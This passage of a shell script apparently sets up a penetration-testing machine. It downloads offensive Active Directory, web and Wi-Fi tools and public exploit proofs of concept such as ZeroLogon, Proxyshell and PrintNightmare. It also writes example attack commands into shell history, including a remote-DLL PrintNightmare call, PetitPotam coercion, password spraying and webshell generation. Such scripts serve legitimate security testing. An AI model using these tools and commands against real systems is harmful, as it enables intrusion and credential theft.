echo "alias PCredz='$INTERNALS_DIR/PCredz/bin/python3 $INTERNALS_DIR/PCredz/Pcredz'" >> ~/.zshrc
echo "Pcredz -f capture.pcap" >> ~/.zsh_history

# PEASS-ng
cd $INTERNALS_DIR
mkdir PEASS-ng
cd PEASS-ng
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/winPEAS.bat
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/winPEASx64.exe
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas_darwin_amd64
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas_linux_amd64
wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS-Light.ps1

# PetitPotam
cd $INTERNALS_DIR
git clone https://github.com/topotam/PetitPotam.git
git clone https://github.com/ly4k/PetitPotam.git PetitPotam-ly4k
echo "python3 PetitPotam.py <ip_listener> <ip_dc>" >> ~/.zsh_history

# Phishing-HTML-linter
cd $REDTEAM
git clone https://github.com/pentest01/phishing-HTML-linter.git

# PKINITtools
cd $INTERNALS_DIR
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
python3 -m venv .
source bin/activate
pip3 install impacket minikerberos
deactivate
echo "alias impacket-getnthash='$INTERNALS_DIR/PKINITtools/bin/python3 $INTERNALS_DIR/PKINITtools/getnthash.py'" >> ~/.zshrc
echo "alias impacket-gets4uticket='$INTERNALS_DIR/PKINITtools/bin/python3 $INTERNALS_DIR/PKINITtools/gets4uticket.py'" >> ~/.zshrc
echo "alias impacket-gettgtpkinit='$INTERNALS_DIR/PKINITtools/bin/python3 $INTERNALS_DIR/PKINITtools/gettgtpkinit.py'" >> ~/.zshrc
echo "impacket-getnthash" >> ~/.zsh_history
echo "impacket-gets4uticket" >> ~/.zsh_history
echo "impacket-gettgtpkinit" >> ~/.zsh_history

# Pre2k
cd $INTERNALS_DIR
git clone https://github.com/garrettfoster13/pre2k.git
cd pre2k
python3 -m venv .
source bin/activate
pip3 install .
deactivate
echo "alias pre2k='$INTERNALS_DIR/pre2k/bin/python3 $INTERNALS_DIR/pre2k/bin/pre2k'" >> ~/.zshrc
echo "pre2k auth -u \$USER -p \$PASSWORD -d \$DOMAIN -dc-ip \$IP -verbose" >> ~/.zsh_history

# PrintNightmare
cd $INTERNALS_DIR
git clone https://github.com/cube0x0/CVE-2021-1675.git PrintNightmare
git clone https://github.com/ly4k/PrintNightmare.git PrintNightmare-ly4k
echo "python3 CVE-2021-1675.py domain.local/user:pass@ip '\\your_ip\smb\your_dll.dll'" >> ~/.zsh_history

# PrivescCheck
cd $INTERNALS_DIR
git clone https://github.com/itm4n/PrivescCheck.git

# Pypycatz
pipx install git+https://github.com/skelsec/pypykatz || echo "[-] Failed to install Pypycatz"

# PyScan
cd $INTERNALS_DIR
git clone https://github.com/afkfr0mkeyb0ard/PyScan.git
echo "alias pyscan='python3 $INTERNALS_DIR/PyScan/pyscan.py'" >> ~/.zshrc
echo "pyscan'" >> ~/.zsh_history

# Pywhisker
cd $INTERNALS_DIR
pipx install git+https://github.com/ShutdownRepo/pywhisker.git
echo "pywhisker -d 'domain.local' -u 'user1' -p 'pass123' --target 'user2' --action 'list'" >> ~/.zsh_history

# Rcat
cd $GENERAL_DIR
wget https://github.com/0xfalafel/rcat/releases/download/0.2/rcat_amd64 rcat
chmod +x rcat
echo "alias rcat='$GENERAL_DIR/rcat'" >> ~/.zshrc
echo "rcat -l 4445 --pwn" >> ~/.zsh_history

# Responder
cd $INTERNALS_DIR
git clone https://github.com/lgandx/Responder.git
echo "alias responder='$INTERNALS_DIR/Responder/Responder.py'" >> ~/.zshrc
echo "responder -I eth0'" >> ~/.zsh_history

# Ridenum
cd $INTERNALS_DIR
git clone https://github.com/trustedsec/ridenum.git
echo "alias ridenum='$INTERNALS_DIR/ridenum/ridenum.py'" >> ~/.zshrc
echo "ridenum <server_ip> <start_rid> <end_rid> <optional_username> <optional_password> <optional_password_file> <optional_username_filename>" >> ~/.zsh_history

# RottenPotatoNG
cd $INTERNALS_DIR
git clone https://github.com/breenmachine/RottenPotatoNG.git

# RSMangler
cd $PASSCRACK_DIR
git clone https://github.com/digininja/RSMangler.git
echo "alias rsmangler='$PASSCRACK_DIR/RSMangler/rsmangler.rb'" >> ~/.zshrc

# Rtl8812au
cd $WIFI_DIR
sudo apt-get -y install dkms bc mokutil build-essential libelf-dev linux-headers-`uname -r`
git clone https://github.com/aircrack-ng/rtl8812au.git
#sudo apt-get update
#sudo apt-get install dkms bc mokutil build-essential libelf-dev linux-headers-`uname -r`
#reboot
#git clone https://github.com/aircrack-ng/rtl8812au.git
#cd rtl8812au
#sudo make dkms_install
#reboot

# SCCMHunter
cd $INTERNALS_DIR
pipx install git+https://github.com/garrettfoster13/sccmhunter/
echo "alias sccmhunter='sccmhunter.py'" >> ~/.zshrc

# SecLists
cd $WEB_DIR
git clone https://github.com/danielmiessler/SecLists.git
cd SecLists
cd Passwords
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# SharpHound
cd $INTERNALS_DIR
wget https://github.com/SpecterOps/SharpHound/releases/download/v2.5.13/SharpHound-v2.5.13.zip
unzip -q SharpHound-v2.5.13.zip -d SharpHound
rm SharpHound-v2.5.13.zip

# Shortscan
cd $WEB_DIR
go install github.com/bitquark/shortscan/cmd/shortscan@latest
echo "alias shortscan='~/go/bin/shortscan'" >> ~/.zshrc
echo "shortscan http://example.org/" >> ~/.zsh_history

# Simplify
cd $MOBILE_DIR
mkdir Simplify
cd Simplify
wget https://github.com/CalebFenton/simplify/releases/download/v1.3.0/simplify-1.3.0.jar
echo "alias simplify='java -jar $MOBILE_DIR/Simplify/simplify-1.3.0.jar'" >> ~/.zshrc
echo "simplify -v" >> ~/.zsh_history

# Smuggler
cd $WEB_DIR
git clone https://github.com/defparam/smuggler.git
echo "alias smuggler='python3 $WEB_DIR/smuggler/smuggler.py'" >> ~/.zshrc

# Smugglo
cd $REDTEAM
git clone https://github.com/b3rito/smugglo.git

# Snoop
cd $RECON_DIR
mkdir Snoop
cd Snoop
wget https://github.com/snooppr/snoop/releases/download/v1.4.2__2025-1-1/Snoop_for_GNU_Linux.rar
unrar x Snoop_for_GNU_Linux.rar
rm Snoop_for_GNU_Linux.rar

# Sourcemapper
cd $WEB_DIR
go install github.com/denandz/sourcemapper@latest
echo "alias sourcemapper='~/go/bin/sourcemapper'" >> ~/.zshrc
echo "sourcemapper -url 'https://DOMAIN/file.js.map' -output ~/Desktop -insecure --header 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'" >> ~/.zsh_history

# Spiderfoot
# Installed by default on Kali but remove comments to install
# cd $RECON_DIR
# git clone https://github.com/smicallef/spiderfoot.git
# cd spiderfoot
# python3 -m venv .
# source bin/activate
# pip3 install -r requirements.txt
# deactivate
# echo "alias spiderfoot='$RECON_DIR/spiderfoot/bin/python3 $RECON_DIR/spiderfoot/sf.py'" >> ~/.zshrc
echo "spiderfoot -l 127.0.0.1:5001" >> ~/.zsh_history
 
# Spoofcheck
cd $RECON_DIR
git clone https://github.com/a6avind/spoofcheck.git
cd spoofcheck
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias spoofcheck='$RECON_DIR/spoofcheck/bin/python3 $RECON_DIR/spoofcheck/spoofcheck.py'" >> ~/.zshrc
echo "spoofcheck <domain>" >> ~/.zsh_history

# SQLmap
cd $WEB_DIR
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
echo "alias sqlmap='python3 $WEB_DIR/sqlmap/sqlmap.py'" >> ~/.zshrc

# Swaks
cd $RECON_DIR
wget https://github.com/jetmore/swaks/releases/download/v20240103.0/swaks-20240103.0.tar.gz
tar -xzf swaks-20240103.0.tar.gz
rm swaks-20240103.0.tar.gz
echo "alias swaks='$RECON_DIR/swaks-20240103.0/swaks'" >> ~/.zshrc

# TeamsEnum
cd $RECON_DIR
git clone https://github.com/sse-secure-systems/TeamsEnum.git
cd TeamsEnum
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias teamsenum='$RECON_DIR/TeamsEnum/bin/python3 $RECON_DIR/TeamsEnum/TeamsEnum.py'" >> ~/.zshrc
echo "teamsenum -a password -u <username> -f emails.txt" >> ~/.zsh_history

# Testssl
cd $WEB_DIR
git clone --depth 1 https://github.com/testssl/testssl.sh.git testssl
echo "alias testssl='$WEB_DIR/testssl/testssl.sh'" >> ~/.zshrc
echo "testssl https://example.com" >> ~/.zsh_history

# TheHarvester
cd $RECON_DIR
pipx install git+https://github.com/laramies/theHarvester.git

# Timeroast
cd $INTERNALS_DIR
git clone https://github.com/SecuraBV/Timeroast.git
echo "python3 timeroast.py" >> ~/.zsh_history

# TomcatSampleWebshell
cd $WEB_DIR
git clone https://github.com/afkfr0mkeyb0ard/TomcatSampleWebshell.git

# TREVORspray
cd $RECON_DIR
pipx install git+https://github.com/blacklanternsecurity/TREVORspray.git
echo "trevorspray --recon evilcorp.com" >> ~/.zsh_history
echo "trevorspray --recon evilcorp.com -u emails.txt --threads 3" >> ~/.zsh_history

# Trufflehog
cd $RECON_DIR
wget https://github.com/trufflesecurity/trufflehog/releases/download/v3.88.20/trufflehog_3.88.20_linux_amd64.tar.gz
tar -xzf trufflehog_3.88.20_linux_amd64.tar.gz
rm README.md LICENSE trufflehog_3.88.20_linux_amd64.tar.gz
chmod +x trufflehog
echo "alias trufflehog='$RECON_DIR/trufflehog'" >> ~/.zshrc
echo "trufflehog git https://github.com/trufflesecurity/test_keys --results=verified,unknown" >> ~/.zsh_history
echo "trufflehog github --org=trufflesecurity --results=verified,unknown" >> ~/.zsh_history
echo "trufflehog s3 --bucket=<bucket name> --results=verified,unknown" >> ~/.zsh_history

# Vita
cd $RECON_DIR
wget https://github.com/junnlikestea/vita/releases/download/0.1.16/vita-0.1.16-x86_64-unknown-linux-musl.tar.gz
tar -xzf vita-0.1.16-x86_64-unknown-linux-musl.tar.gz
rm vita-0.1.16-x86_64-unknown-linux-musl.tar.gz
mv vita-0.1.16-x86_64-unknown-linux-musl/vita .
rm -r vita-0.1.16-x86_64-unknown-linux-musl
echo "alias vita='$RECON_DIR/vita'" >> ~/.zshrc
echo "vita -d hackerone.com" >> ~/.zsh_history

# Waybackurls
cd $WEB_DIR
wget https://github.com/tomnomnom/waybackurls/releases/download/v0.1.0/waybackurls-linux-amd64-0.1.0.tgz
tar -xzf waybackurls-linux-amd64-0.1.0.tgz
rm waybackurls-linux-amd64-0.1.0.tgz
chmod +x waybackurls
echo "alias waybackurls='$WEB_DIR/waybackurls'" >> ~/.zshrc 

# WebCacheVulnerabilityScanner
cd $WEB_DIR
wget https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner/releases/download/1.4.2/web-cache-vulnerability-scanner_1.4.2_linux_amd64.tar.gz
tar -xzf web-cache-vulnerability-scanner_1.4.2_linux_amd64.tar.gz
rm web-cache-vulnerability-scanner_1.4.2_linux_amd64.tar.gz
echo "alias web-cache-vulnerability-scanner='$WEB_DIR/wcvs'" >> ~/.zshrc

# Webclientservicescanner
cd $INTERNALS_DIR
pipx install git+https://github.com/Hackndo/WebclientServiceScanner || echo "[-] Failed to install Webclientservicescanner"
pipx ensurepath
echo "webclientservicescanner domain.local/user:pass@10.10.10.0/24" >> ~/.zsh_history

# Weevely3
cd $WEB_DIR
git clone https://github.com/epinna/weevely3.git
echo "alias weevely3='python3 $WEB_DIR/weevely3/weevely.py'" >> ~/.zshrc
echo "weevely3 generate <password> <path>" >> ~/.zsh_history
echo "weevely3 <URL> <password> <cmd>" >> ~/.zsh_history

# Wef
cd $WIFI_DIR
git clone https://github.com/D3Ext/WEF.git
sudo $WIFI_DIR/WEF/wef
echo "alias wef='bash $WIFI_DIR/WEF/wef'" >> ~/.zshrc

# Wi-Fi Hotspot
cd $WIFI_DIR
wget https://github.com/lakinduakash/linux-wifi-hotspot/releases/download/v4.7.2/linux-wifi-hotspot_4.7.2_amd64.deb
chmod +x linux-wifi-hotspot_4.7.2_amd64.deb
sudo apt -y install ./linux-wifi-hotspot_4.7.2_amd64.deb

# Windows-Exploit-Suggester
cd $INTERNALS_DIR
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
echo "alias windows-exploit-suggester='python2.7 $INTERNALS_DIR/Windows-Exploit-Suggester/windows-exploit-suggester.py'" >> ~/.zshrc
echo "windows-exploit-suggester --update" >> ~/.zsh_history
echo "windows-exploit-suggester --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt" >> ~/.zsh_history

# Wpscan
# Installed by default on Kali
echo "wpscan --url 'https://example.com/' --user-agent 'Windows Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0' -e vp,vt,cb,dbe,u1-50 --api-token <yourapitoken>" >> ~/.zsh_history

# Ysoserial
cd $WEB_DIR
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

echo "[+] All tools were setup."

#############################################################
### Installation of the scripts/exploits
#############################################################

echo "[+] Downloading scripts/exploits"

# Cpassword_decrypt
cd $INTERNALS_DIR
pipx install git+https://github.com/t0thkr1s/gpp-decrypt.git --include-deps

# CVE-2025-24071 (NTLM auth via ZIP/RAR)
cd $GENERAL_DIR
git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git

# iLO4_add_admin
cd $INTERNALS_DIR
wget https://www.exploit-db.com/download/44005
mv 44005 iLO4_add_admin.py

# Proxyshell
cd $INTERNALS_DIR
git clone https://github.com/dmaasland/proxyshell-poc.git
cd proxyshell-poc
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias proxyshell-enumerate='$INTERNALS_DIR/proxyshell-poc/bin/python3 $INTERNALS_DIR/proxyshell-poc/proxyshell-enumerate.py'" >> ~/.zshrc
echo "alias proxyshell-poc='$INTERNALS_DIR/proxyshell-poc/bin/python3 $INTERNALS_DIR/proxyshell-poc/proxyshell.py'" >> ~/.zshrc
echo "alias proxyshell-rce='$INTERNALS_DIR/proxyshell-poc/bin/python3 $INTERNALS_DIR/proxyshell-poc/proxyshell_rce.py'" >> ~/.zshrc

# ZeroLogon
cd $INTERNALS_DIR
git clone https://github.com/dirkjanm/CVE-2020-1472.git Zerologon
